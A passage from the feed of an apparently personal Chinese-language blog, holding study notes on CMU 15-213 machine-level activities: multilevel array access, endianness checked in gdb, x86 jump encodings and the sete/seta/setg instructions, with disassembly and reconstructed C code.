这里的计算公式就是 &lt;code&gt;a[row][col] = *(*(arr + row * 8) + column)&lt;/code&gt; (因为 &lt;code&gt;int8_t&lt;/code&gt;  是 1 个字节，所以无需乘上 &lt;code&gt;sizeof(T)&lt;/code&gt; )。此处 &lt;code&gt;arr&lt;/code&gt;  应该是基地址， &lt;code&gt;row&lt;/code&gt;  存储在一个寄存器中， &lt;code&gt;column&lt;/code&gt;  存储在一个寄存器中。&lt;/p&gt;
&lt;p&gt;对该函数进行反汇编，结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble accessMultilevel
Dump of assembler code for function accessMultilevel:
   0x00000000004005c1 &amp;lt;+0&amp;gt;:     add    (%rdi,%rsi,8),%rdx ;; %rdx += *(%rdi + 8 * %rsi)
   0x00000000004005c5 &amp;lt;+4&amp;gt;:     movzbl (%rdx),%eax ;; %eax = *(%rdx)
   0x00000000004005c8 &amp;lt;+7&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里 &lt;code&gt;%rdx&lt;/code&gt;  中存储的是 &lt;code&gt;column&lt;/code&gt; ， &lt;code&gt;%rdi&lt;/code&gt;  中存储的是 &lt;code&gt;arr&lt;/code&gt;  的基地址， &lt;code&gt;%rsi&lt;/code&gt;  中存储的是 &lt;code&gt;row&lt;/code&gt; 。如果 &lt;code&gt;first&lt;/code&gt;  和 &lt;code&gt;second&lt;/code&gt;  都含有 4 个元素的话，地址的计算不影响。但是如果俩数组长度不一样，那么索引的时候可能会出现地址越界的问题。&lt;/p&gt;
&lt;p&gt;如果数组这样定义：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;int8_t&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; multilevel &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;first&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; first&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;那么如果修改一个 &lt;code&gt;first&lt;/code&gt;  的元素值的话，两个索引指向同一个数组，两索引对应数组那个值都会改变。&lt;/p&gt;
&lt;h2 id=&#34;endianness-optional&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#endianness-optional&#34;&gt;#&lt;/a&gt; Endianness (Optional)&lt;/h2&gt;
&lt;p&gt;还是之前那个 &lt;code&gt;courses&lt;/code&gt;  结构体，我们先按照 4 个字节一组的单位打印它的值看看，再按照 1 个字节一组为单位打印前 4 个字节看看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) x/4wx courses
0x601110 &amp;lt;courses&amp;gt;:     0x00015213      0x00015513      0x00018213      0x00018600
(gdb) x/4bx courses
0x601110 &amp;lt;courses&amp;gt;:     0x13    0x52    0x01    0x00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;我们可以看到一个数 ( &lt;code&gt;int&lt;/code&gt;  类型，4 个字节)，按照 4 个字节一组打印的时候，显示的是 &lt;code&gt;0x15213&lt;/code&gt; ，但是按照单个字节打印的时候发现低地址字节存放在低地址处，高地址字节存放在高地址处，因此该机器为小端序机器。小端序机器的缺陷在于不方便单字节读取，字节的顺序是倒过来的。&lt;/p&gt;
&lt;p&gt;但是小端序机器也有优点， &lt;code&gt;narrowingCast&lt;/code&gt;  函数的 C 语言版本如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;narrowingCast&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;num&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;我们对 &lt;code&gt;narrowingCast&lt;/code&gt;  函数进行反汇编，得到如下结果：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble narrowingCast
Dump of assembler code for function narrowingCast:
   0x00000000004005c9 &amp;lt;+0&amp;gt;:     mov    (%rdi),%eax
   0x00000000004005cb &amp;lt;+2&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这个函数的功能是，将一个 &lt;code&gt;long*&lt;/code&gt;  类型的指针解引，然后把它指向的地址的 4 个字节赋给 &lt;code&gt;%eax&lt;/code&gt; 。&lt;br&gt;
这里的一个问题是，对于一个数字： &lt;code&gt;0x0000000012345678&lt;/code&gt; 。如果是小端法，低位字节存储在 &lt;code&gt;%rsp&lt;/code&gt;  处，一直到 &lt;code&gt;%rsp + 3&lt;/code&gt; 。而如果是大端法，低位字节存储在 &lt;code&gt;%rsp + 7&lt;/code&gt; ，高位字节存储在 &lt;code&gt;%rsp + 4&lt;/code&gt; 。因此如果是大端法，就没法用 &lt;code&gt;mov (%rdi),%eax&lt;/code&gt;  来获取值，而应该用 &lt;code&gt;mov 4(%rdi),%eax&lt;/code&gt;  来获取值&lt;/p&gt;
</content>
        <updated>2024-02-29T09:15:08.000Z</updated>
    </entry>
    <entry>
        <id>https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/</id>
        <title>15-213 Machine Control Activity 记录</title>
        <link rel="alternate" href="https://salvely.github.io/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Activity/Machine%20control%20activity/"/>
        <content type="html">&lt;h2 id=&#34;basic-control-flow&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#basic-control-flow&#34;&gt;#&lt;/a&gt; Basic Control Flow&lt;/h2&gt;
&lt;p&gt;首先回答 Q1：为什么 JZ 和 JE 指令相同？&lt;br&gt;
对于 JZ，即 jump if zero，在跳转之前，我们首先需要将其与 0 做差，判断结果的 ZF 是否等于 1。对于 JE，我们首先将两数做差（也可以使用 &lt;code&gt;testq&lt;/code&gt;  指令？），然后判断 ZF 是否等于 1。JZ 和 JE 都是对 ZF 进行判断，然后进行跳转。&lt;/p&gt;
&lt;p&gt;然后我们回答 Q2：首先阅读 &lt;code&gt;jumps.S&lt;/code&gt; 。我们发现 &lt;code&gt;jumps.S&lt;/code&gt;  就是以 &lt;code&gt;jump_insns&lt;/code&gt;  开头的一群跳转指令的集合。然后我们输入如下指令：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;figcaption data-lang=&#34;bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ as jumps.S &lt;span class=&#34;token parameter variable&#34;&gt;-o&lt;/span&gt; jumps.o&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;$ objdump &lt;span class=&#34;token parameter variable&#34;&gt;-d&lt;/span&gt; jumps.o&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;其结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;
jumps.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;jump_insns&amp;gt;:
   0:   eb 34                   jmp    36 &amp;lt;destination&amp;gt;
   2:   70 32                   jo     36 &amp;lt;destination&amp;gt;
   4:   71 30                   jno    36 &amp;lt;destination&amp;gt;
   6:   72 2e                   jb     36 &amp;lt;destination&amp;gt;
   8:   72 2c                   jb     36 &amp;lt;destination&amp;gt;
   a:   72 2a                   jb     36 &amp;lt;destination&amp;gt;
   c:   73 28                   jae    36 &amp;lt;destination&amp;gt;
   e:   73 26                   jae    36 &amp;lt;destination&amp;gt;
  10:   73 24                   jae    36 &amp;lt;destination&amp;gt;
  12:   74 22                   je     36 &amp;lt;destination&amp;gt;
  14:   74 20                   je     36 &amp;lt;destination&amp;gt;
  16:   75 1e                   jne    36 &amp;lt;destination&amp;gt;
  18:   75 1c                   jne    36 &amp;lt;destination&amp;gt;
  1a:   76 1a                   jbe    36 &amp;lt;destination&amp;gt;
  1c:   76 18                   jbe    36 &amp;lt;destination&amp;gt;
  1e:   77 16                   ja     36 &amp;lt;destination&amp;gt;
  20:   77 14                   ja     36 &amp;lt;destination&amp;gt;
  22:   78 12                   js     36 &amp;lt;destination&amp;gt;
  24:   79 10                   jns    36 &amp;lt;destination&amp;gt;
  26:   7c 0e                   jl     36 &amp;lt;destination&amp;gt;
  28:   7c 0c                   jl     36 &amp;lt;destination&amp;gt;
  2a:   7d 0a                   jge    36 &amp;lt;destination&amp;gt;
  2c:   7d 08                   jge    36 &amp;lt;destination&amp;gt;
  2e:   7e 06                   jle    36 &amp;lt;destination&amp;gt;
  30:   7e 04                   jle    36 &amp;lt;destination&amp;gt;
  32:   7f 02                   jg     36 &amp;lt;destination&amp;gt;
  34:   7f 00                   jg     36 &amp;lt;destination&amp;gt;

0000000000000036 &amp;lt;destination&amp;gt;:
  36:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这些指令的共同点就是都跳转到地址为 36 的 &lt;code&gt;destination&lt;/code&gt;  处。此外，每个跳转指令的编码都是 2 个字节，第二个字节的值即为跳转的相对偏移地址，其值 = 目的地址 - 下一套指令的地址（因为执行到这里的时候 PC 已经指向下一条了），所以需要将该值增加到 PC 中，然后进行跳转。&lt;/p&gt;
&lt;p&gt;接下来我们将 &lt;code&gt;.skip 97&lt;/code&gt;  一行注释掉，然后再编译并且反汇编看看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
jumps.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;jump_insns&amp;gt;:
   0:   e9 bd 00 00 00          jmpq   c2 &amp;lt;destination&amp;gt;
   5:   0f 80 b7 00 00 00       jo     c2 &amp;lt;destination&amp;gt;
   b:   0f 81 b1 00 00 00       jno    c2 &amp;lt;destination&amp;gt;
  11:   0f 82 ab 00 00 00       jb     c2 &amp;lt;destination&amp;gt;
  17:   0f 82 a5 00 00 00       jb     c2 &amp;lt;destination&amp;gt;
  1d:   0f 82 9f 00 00 00       jb     c2 &amp;lt;destination&amp;gt;
  23:   0f 83 99 00 00 00       jae    c2 &amp;lt;destination&amp;gt;
  29:   0f 83 93 00 00 00       jae    c2 &amp;lt;destination&amp;gt;
  2f:   0f 83 8d 00 00 00       jae    c2 &amp;lt;destination&amp;gt;
  35:   0f 84 87 00 00 00       je     c2 &amp;lt;destination&amp;gt;
  3b:   0f 84 81 00 00 00       je     c2 &amp;lt;destination&amp;gt;
  41:   75 7f                   jne    c2 &amp;lt;destination&amp;gt;
  43:   75 7d                   jne    c2 &amp;lt;destination&amp;gt;
  45:   76 7b                   jbe    c2 &amp;lt;destination&amp;gt;
  47:   76 79                   jbe    c2 &amp;lt;destination&amp;gt;
  49:   77 77                   ja     c2 &amp;lt;destination&amp;gt;
  4b:   77 75                   ja     c2 &amp;lt;destination&amp;gt;
  4d:   78 73                   js     c2 &amp;lt;destination&amp;gt;
  4f:   79 71                   jns    c2 &amp;lt;destination&amp;gt;
  51:   7c 6f                   jl     c2 &amp;lt;destination&amp;gt;
  53:   7c 6d                   jl     c2 &amp;lt;destination&amp;gt;
  55:   7d 6b                   jge    c2 &amp;lt;destination&amp;gt;
  57:   7d 69                   jge    c2 &amp;lt;destination&amp;gt;
  59:   7e 67                   jle    c2 &amp;lt;destination&amp;gt;
  5b:   7e 65                   jle    c2 &amp;lt;destination&amp;gt;
  5d:   7f 63                   jg     c2 &amp;lt;destination&amp;gt;
  5f:   7f 61                   jg     c2 &amp;lt;destination&amp;gt;
        ...

00000000000000c2 &amp;lt;destination&amp;gt;:
  c2:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vY2QvRTI2NTAyXzAxL2h0bWwvRTI4Mzg4L2VvaXlnLmh0bWw=&#34;&gt;Oracle 的 x86 Assembly Language Reference Manual &lt;/span&gt;中写道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.skip integer, value&lt;/p&gt;
&lt;p&gt;While generating values for any data section, the .skip directive causes integer bytes to be skipped over, or, optionally, filled with the specified value.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;将 97 改为 98，再次处理后查看：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
jumps.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 &amp;lt;jump_insns&amp;gt;:
   0:   e9 c2 00 00 00          jmpq   c7 &amp;lt;destination&amp;gt;
   5:   0f 80 bc 00 00 00       jo     c7 &amp;lt;destination&amp;gt;
   b:   0f 81 b6 00 00 00       jno    c7 &amp;lt;destination&amp;gt;
  11:   0f 82 b0 00 00 00       jb     c7 &amp;lt;destination&amp;gt;
  17:   0f 82 aa 00 00 00       jb     c7 &amp;lt;destination&amp;gt;
  1d:   0f 82 a4 00 00 00       jb     c7 &amp;lt;destination&amp;gt;
  23:   0f 83 9e 00 00 00       jae    c7 &amp;lt;destination&amp;gt;
  29:   0f 83 98 00 00 00       jae    c7 &amp;lt;destination&amp;gt;
  2f:   0f 83 92 00 00 00       jae    c7 &amp;lt;destination&amp;gt;
  35:   0f 84 8c 00 00 00       je     c7 &amp;lt;destination&amp;gt;
  3b:   0f 84 86 00 00 00       je     c7 &amp;lt;destination&amp;gt;
  41:   0f 85 80 00 00 00       jne    c7 &amp;lt;destination&amp;gt;
  47:   75 7e                   jne    c7 &amp;lt;destination&amp;gt;
  49:   76 7c                   jbe    c7 &amp;lt;destination&amp;gt;
  4b:   76 7a                   jbe    c7 &amp;lt;destination&amp;gt;
  4d:   77 78                   ja     c7 &amp;lt;destination&amp;gt;
  4f:   77 76                   ja     c7 &amp;lt;destination&amp;gt;
  51:   78 74                   js     c7 &amp;lt;destination&amp;gt;
  53:   79 72                   jns    c7 &amp;lt;destination&amp;gt;
  55:   7c 70                   jl     c7 &amp;lt;destination&amp;gt;
  57:   7c 6e                   jl     c7 &amp;lt;destination&amp;gt;
  59:   7d 6c                   jge    c7 &amp;lt;destination&amp;gt;
  5b:   7d 6a                   jge    c7 &amp;lt;destination&amp;gt;
  5d:   7e 68                   jle    c7 &amp;lt;destination&amp;gt;
  5f:   7e 66                   jle    c7 &amp;lt;destination&amp;gt;
  61:   7f 64                   jg     c7 &amp;lt;destination&amp;gt;
  63:   7f 62                   jg     c7 &amp;lt;destination&amp;gt;
        ...

00000000000000c7 &amp;lt;destination&amp;gt;:
  c7:   c3                      retq
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;下一个问题是：为什么会这样？指令 &lt;code&gt;eb f0&lt;/code&gt;  又是做什么的？This happens for each instruction that needs to&lt;br&gt;
encode a change in % rip larger than 0x7F.（源自&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY3MuY211LmVkdS9hZnMvY3MvYWNhZGVtaWMvY2xhc3MvMTUyMTMtZjIzL3d3dy9hY3Rpdml0aWVzL21hY2hpbmUtY29udHJvbC1zb2xuLnBkZg==&#34;&gt; Solution&lt;/span&gt;)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;comparisons-and-conditional-set-instructions&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#comparisons-and-conditional-set-instructions&#34;&gt;#&lt;/a&gt; Comparisons and Conditional Set Instructions&lt;/h2&gt;
&lt;p&gt;运行 &lt;code&gt;gdb ./cmp-set&lt;/code&gt; ，输入 &lt;code&gt;r&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) r
Starting program: /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set

This program should be run inside GDB:
  $ gdb /home/gwen/Documents/report/code/15213/Ch3 Machine Level Programming/machine-control/cmp-set
  (gdb) r
If you didn&#39;t run it that way, it will now crash.
Otherwise, you will get the (gdb) prompt back.

Type &#39;c&#39; (short for &#39;continue&#39;) at the (gdb) prompt.

Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-control/cmp-set.c:43
43      machine-control/cmp-set.c: No such file or directory.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;输入 &lt;code&gt;c&lt;/code&gt; ，提示如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) c
Continuing.

Besides &#39;main&#39;, this program defines three functions:
    &#39;sete&#39;, &#39;seta&#39;, and &#39;setg&#39;.

Use the &#39;disassemble&#39; command on each to see their code.
Then, as instructed in the handout, use the &#39;call&#39; command
to call them with various arguments.

When you have answered all the questions in this section of
the handout, use the &#39;c&#39; command to go on.

Program received signal SIGTRAP, Trace/breakpoint trap.
main (argc=&amp;lt;optimized out&amp;gt;, argv=&amp;lt;optimized out&amp;gt;) at machine-control/cmp-set.c:45
45      in machine-control/cmp-set.c
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;分别使用 &lt;code&gt;disassemble&lt;/code&gt;  命令来查看 &lt;code&gt;sete&lt;/code&gt; , &lt;code&gt;seta&lt;/code&gt;  和 &lt;code&gt;setg&lt;/code&gt;  三条指令，使用 &lt;code&gt;call&lt;/code&gt;  命令来调用他们，完成任务后使用 &lt;code&gt;c&lt;/code&gt;  来继续。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sete&lt;/code&gt;  反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;(gdb) disassemble sete
Dump of assembler code for function sete:
   0x0000000000401178 &amp;lt;+0&amp;gt;:     cmp    %si,%di
   0x000000000040117b &amp;lt;+3&amp;gt;:     sete   %al
   0x000000000040117e &amp;lt;+6&amp;gt;:     movzbl %al,%eax
   0x0000000000401181 &amp;lt;+9&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 &lt;code&gt;sete&lt;/code&gt;  中， &lt;code&gt;%si&lt;/code&gt;  和 &lt;code&gt;%di&lt;/code&gt;  包含参数， &lt;code&gt;%eax&lt;/code&gt;  中包含返回值。该函数的 C 代码还原如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里到底是 &lt;code&gt;uint16_t&lt;/code&gt;  还是 &lt;code&gt;int16_t&lt;/code&gt; ? 有区别吗？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdint.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;uint16_t&lt;/span&gt; si&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;uint16_t&lt;/span&gt; di&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; si &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; di&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;seta&lt;/code&gt;  函数的反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble seta
Dump of assembler code for function seta:
   0x000000000040118c &amp;lt;+0&amp;gt;:     cmp    %si,%di
   0x000000000040118f &amp;lt;+3&amp;gt;:     seta   %al
   0x0000000000401192 &amp;lt;+6&amp;gt;:     movzbl %al,%eax
   0x0000000000401195 &amp;lt;+9&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;seta&lt;/code&gt;  比较的是无符号数，其 C 语言代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdint.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;uint16_t&lt;/span&gt; si&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;uint16_t&lt;/span&gt; di&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; di &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; si&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;code&gt;setg&lt;/code&gt;  函数的反汇编结果如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;(gdb) disassemble setg
Dump of assembler code for function setg:
   0x0000000000401182 &amp;lt;+0&amp;gt;:     cmp    %si,%di
   0x0000000000401185 &amp;lt;+3&amp;gt;:     setg   %al
   0x0000000000401188 &amp;lt;+6&amp;gt;:     movzbl %al,%eax
   0x000000000040118b &amp;lt;+9&amp;gt;:     retq
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;setg&lt;/code&gt;  比较的是有符号数，其 C 语言代码如下：&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;figcaption data-lang=&#34;c&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token macro property&#34;&gt;&lt;span class=&#34;token directive-hash&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;token directive keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&amp;lt;stdint.h&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;sete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;int16_t&lt;/span&gt; si&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;int16_t&lt;/span&gt; di&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; di &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; si&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;注意 &lt;code&gt;setg&lt;/code&gt;  和 &lt;code&gt;seta&lt;/code&gt;  有区别。&lt;br&gt;
对不同组别的值分别调用 &lt;code&gt;sete&lt;/code&gt; , &lt;code&gt;seta&lt;/code&gt;  和 &lt;code&gt;setg&lt;/code&gt; ，其值如下：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;arg1&lt;/th&gt;
&lt;th&gt;arg2&lt;/th&gt;
&lt;th&gt;&lt;code&gt;sete&lt;/code&gt;&lt;/th&gt;
&lt;th&gt;&lt;code&gt;setg&lt;/code&gt;&lt;/th&gt;
